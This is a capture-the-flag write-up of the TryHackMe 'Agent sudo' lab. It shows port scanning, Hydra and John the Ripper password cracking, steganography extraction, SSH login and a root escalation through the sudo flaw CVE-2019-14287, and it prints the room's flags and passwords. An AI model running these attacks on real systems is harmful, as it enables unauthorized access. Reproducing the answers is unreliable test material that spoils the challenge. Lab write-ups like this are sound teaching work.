### Agent sudo   

```
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
```

Agent sudo is a easy CTF and my first machine hacked, in this challenge we need to discover inside the server and get the flag using brute force and escalating privileges.  

The first task is only to deploy the machine and it give me the IP 10.10.15.236, so I'll start with task 2:  

### Task 2   

**2.1 How many open ports?**    

To discover this, we can use **nmap** to attack the IP and discover the open ports:

```
$ nmap -sV 10.10.15.236  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 22:03 EDT  
Nmap scan report for 10.10.15.236  
Host is up (0.22s latency).  
Not shown: 997 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/  
Nmap done: 1 IP address (1 host up) scanned in 38.08 seconds  
```

We have 3 open ports, this 3 ports will help us to get inside the server and exploit vulnerabilites.  

**2.2 How you redirect yourself to a secret page?**    

We can search the IP of the machine in a web browser and get the next result:
![Capture](https://github.com/user-attachments/assets/ac383ec5-cad0-4d06-9a48-b1650eb9853c)

If we use the **user-agent** we can get access in the system, so, the answer is user-agent.  

**2.3 What is the agent name?**  

Using the user-agent in the http header we can get the access, for this I'll use **Burp Suite** to send modified requests and get the access:  
![Capture](https://github.com/user-attachments/assets/6e458162-0f3d-4a5e-9cf1-f517409576a2)  

Now charging the site in Burp Suite we can modify the header:
![Original Request](https://github.com/user-attachments/assets/f7d70dd4-8066-48d9-854d-75f028520773)  

In the website, the Agent R said the user have to use their **codenames** to gain access, if we use the codename of the Agent R in the user-agent we can enter 
![Modified Request](https://github.com/user-attachments/assets/47efbd51-5d6b-499c-81bd-177f71728eb6)  

The response is different, this means it work. Now if their codename is a letter, following this logic, the rest of codenames are the letters of the alphabet, with letters A and B we don't have interesting results, but when we put "C" we have the next result:
![Redirection](https://github.com/user-attachments/assets/313afaf2-bea3-494c-9a9b-c8ffe673465f)  

The site with codename C have a redirection, let's follow it:
![Chris](https://github.com/user-attachments/assets/95d7cc3d-6c81-4bd1-a294-327534c626a3)

In the response we can see "Attention Chris", so, the name of the agent is **chris**  

### Task 3  

**3.1 FTP password**  

We have a name "chris", so, we can try to get inside of the FTP server using his name as username, with the help of **Hydra** we can make a brute force attack and get his password, and by the message of the Agent R, his password is weak so, we can try using rockyou.txt to obtain the passowrd:  

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.15.236 ftp  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-28 22:29:51  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task  
[DATA] attacking ftp://10.10.15.236:21/  
[21][ftp] host: 10.10.15.236   login: chris   password: crystal  
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 15 active  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-28 22:30:55  
```

The password is **crystal**, agent R was right when he said is a weak password. Now we can access to the FTP server:  

```
$ ftp 10.10.15.236  
Connected to 10.10.15.236.  
220 (vsFTPd 3.0.3)  
Name (10.10.15.236:kali): chris  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
229 Entering Extended Passive Mode (|||47254|)  
150 Here comes the directory listing.  
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt  
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg  
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png  
226 Directory send OK.  
ftp> get To_agentJ.txt  
local: To_agentJ.txt remote: To_agentJ.txt  
229 Entering Extended Passive Mode (|||46486|)  
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).  
100% |********************************|   217       35.17 KiB/s    00:00 ETA  
226 Transfer complete.  
217 bytes received in 00:00 (1.08 KiB/s)  
ftp> get cute-alien.jpg  
local: cute-alien.jpg remote: cute-alien.jpg  
229 Entering Extended Passive Mode (|||39376|)  
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).  
100% |********************************| 33143      165.28 KiB/s    00:00 ETA  
226 Transfer complete.  
33143 bytes received in 00:00 (84.98 KiB/s)  
ftp> get cutie.png  
local: cutie.png remote: cutie.png  
229 Entering Extended Passive Mode (|||17565|)  
150 Opening BINARY mode data connection for cutie.png (34842 bytes).  
100% |********************************| 34842      178.90 KiB/s    00:00 ETA  
226 Transfer complete.  
34842 bytes received in 00:00 (90.57 KiB/s)  
ftp>   
```

I downloaded all the files in the FTP server, and I opened the .txt file and it says the next message:

```
$ cat To_agentJ.txt  
Dear agent J,  

All these alien like photos are fake! Agent R stored the real picture inside your directory.  
Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.  

From,  
Agent C  
```

Now we have to investigate in the images to see the real photo.  

**3.2 Zip file password**  
Let's see if the photos have embedded files using **binwalk** and extract it:  

```
$ binwalk -e cutie.png  

DECIMAL       HEXADECIMAL     DESCRIPTION  
--------------------------------------------------------------------------------  
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced  
869           0x365           Zlib compressed data, best compression  

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly  
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt  
34820         0x8804          End of Zip archive, footer length: 22  
```
After this, it create a new folder with all the files extracted and the location is the folder where we're working: "_cutie.png.extracted"

The photo "cutie.png" have embedded files, and it contain a .zip file, unfortunately it's protected with a password, but no problem! Let's use **John the Ripper** to brute force the file. First of all, we need to convert it to hash:  

```
zip2john 8702.zip > 8702.hash
```

Now we can use John the Ripper:

```
$ john 8702.hash --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])  
Cost 1 (HMAC size) is 78 for all loaded hashes  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
alien            (8702.zip/To_agentR.txt)  
1g 0:00:00:02 DONE (2024-08-28 23:09) 0.4310g/s 10593p/s 10593c/s 10593C/s travon..280789  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.  
```

The password is **alien**  

**3.3 steg password**  

Let's uncompress the .zip file with the password:

```
$ 7z e 8702.zip  

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20  
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024  

Scanning the drive for archives:  
1 file, 280 bytes (1 KiB)  

Extracting archive: 8702.zip  
--
Path = 8702.zip  
Type = zip  
Physical Size = 280  

    
Enter password (will not be echoed):  
Everything is Ok  

Size:       86  
Compressed: 280  
```

And the file give us a .txt file:

```
$ cat To_agentR.txt  
Agent C,  

We need to send the picture to 'QXJlYTUx' as soon as possible!  

By,  
Agent R  
```

The string 'QXJlYTUx' is in Base64 format:  

```
$ echo -n "QXJlYTUx" | base64 -d  
Area51
```

The steg password is **Area51**

**3.4 Who is the other agent (in full name)?**  

We've done with the first photo, now let's work with the other photo, using binwalk don't give us results, so, let's use **steghide** to see is something is embedded:  

```
$ steghide --info cute-alien.jpg  
"cute-alien.jpg":  
  format: jpeg  
  capacity: 1.8 KB  
Try to get information about embedded data ? (y/n) y  
Enter passphrase:   
  embedded file "message.txt":  
    size: 181.0 Byte  
    encrypted: rijndael-128, cbc  
    compressed: yes  
```

The passphrase is "Area 51".  

As we can see, the file have a .txt file embedded, so, let's extract it:  
```
$ steghide --extract -sf cute-alien.jpg  
Enter passphrase:  
wrote extracted data to "message.txt".  
```

And now reading the text:   
```
$ cat message.txt  
Hi james,  

Glad you find this message. Your login password is hackerrules!  

Don't ask me why the password look cheesy, ask agent R who set this password for you.  

Your buddy,  
chris  
```

The other agent name is **James**.  

**3.4 SSH password**
The .txt file gave us the password, is: **hackerrules!**  

### Task 4   

**4.1 What is the user flag?**
Let's get inside of the SSH using the credentials we've stolen:  

**At this point my machine had expired and now the IP changed, now I'll use 10.10.26.1**  

```
$ ssh james@10.10.26.1  
The authenticity of host '10.10.26.1 (10.10.26.1)' can't be established.  
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.  
This host key is known by the following other names/addresses:  
    ~/.ssh/known_hosts:1: [hashed name]  
Are you sure you want to continue connecting (yes/no/[fingerprint])? y  
Please type 'yes', 'no' or the fingerprint: yes  
Warning: Permanently added '10.10.26.1' (ED25519) to the list of known hosts.  
james@10.10.26.1's password:  
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)  

 * Documentation:  https://help.ubuntu.com  
 * Management:     https://landscape.canonical.com  
 * Support:        https://ubuntu.com/advantage  

  System information as of Thu Aug 29 03:42:51 UTC 2024  

  System load:  1.2               Processes:           96  
  Usage of /:   39.8% of 9.78GB   Users logged in:     0  
  Memory usage: 38%               IP address for eth0: 10.10.26.1  
  Swap usage:   0%  


75 packages can be updated.  
33 updates are security updates.  


Last login: Tue Oct 29 14:26:27 2019  

james@agent-sudo:~$  
```

Seeing all the files of the SSh we can find the flag:

```
james@agent-sudo:~$ ls  
Alien_autospy.jpg  user_flag.txt  
james@agent-sudo:~$ cat user_flag.txt  
b03d975e8c92a7c04146cfa7a5a313c7  
james@agent-sudo:~$
```

The flag is: **b03d975e8c92a7c04146cfa7a5a313c7**  


**4.2 What is the incident of the photo called?**  
We need to get the photo, for this we can create a local server inside of the ssh to see the directory in a web browser:  
```
$ python3 -m http.server
```
And now in a web browser we can see the directory following this link: http://10.10.26.1:8000/  

![Directory](https://github.com/user-attachments/assets/1aeccf32-c83f-4cba-b26d-d89436f0f11e)

Now we can see the image:
![Alien](https://github.com/user-attachments/assets/7cabf597-87c4-4048-8602-764557bb4af9)

A ugly alien. We can do a reverse search of the image to find the incident of the photo:
![Reverse search](https://github.com/user-attachments/assets/e0dd4aa7-2dcd-42aa-a600-57f749d2f985)  

![Result](https://github.com/user-attachments/assets/36b1d81b-8667-40ba-aa93-52dac55f053f)  

Searching in articles, we can see it was an autopsy, and the answer is: **Roswell alien autopsy**  

### Task 5  

**5.1 CVE number for the escalation**  

If we type: "sudo -l" in the ssh console trying to get major privileges, we have the next message:  

```
james@agent-sudo:~$ sudo -l  
[sudo] password for james:  
Matching Defaults entries for james on agent-sudo:  
    env_reset, mail_badpass,  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User james may run the following commands on agent-sudo:  
    (ALL, !root) /bin/bash  
```

The last message "(ALL, !root) /bin/bash" is a vulnerability in Linux servers, searching this message in Google we found this in Exploit-DB:  

![CVE](https://github.com/user-attachments/assets/2ed69c01-80e0-465c-b1c1-ee24cf49d09d)

We have the CVE number and the steps to exploit the vulnerability, so, the answer is: **CVE-2019-14287**  

**5.2 What is the root flag?**  

To find the flag, we have to exploit the vulnerability. Reading the article of Exploit-DB, if we use this command: "sudo -u#-1 /bin/bash" we can exploit it and get major privileges:

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash  
root@agent-sudo:~#  
```

And now we're root user, now we can access to the root folder:  

```
root@agent-sudo:~# cd /root  
root@agent-sudo:/root# ls  
root.txt  
root@agent-sudo:/root# cat root.txt  
To Mr.hacker,  

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.  

Your flag is  
b53a02f55b57d4439e3341834d70c062  

By,  
DesKel a.k.a Agent R  
```

We founded the root flag: **b53a02f55b57d4439e3341834d70c062**  

**5.3 (Bonus) Who is Agent R?**  
The answer is in the flag: **DesKel**
